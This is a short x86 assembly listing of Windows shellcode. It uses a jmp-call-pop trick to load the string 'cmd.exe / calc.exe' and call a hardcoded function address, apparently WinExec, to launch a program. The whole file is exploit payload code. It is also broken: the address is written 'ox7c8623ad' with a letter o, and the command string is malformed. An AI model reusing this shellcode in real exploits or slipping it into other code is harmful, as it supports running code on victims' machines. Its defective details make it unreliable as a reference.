    global _start
    section .text

_start:
    jmp short call_shellcode

shellcode_return:
    pop ebx
    xor eax,eax
    push ebx
    mov ebx,ox7c8623ad
    call ebx

call_shellcode:
    call shellcode_return
    db "cmd.exe / calc.exe"
    db 0x00
    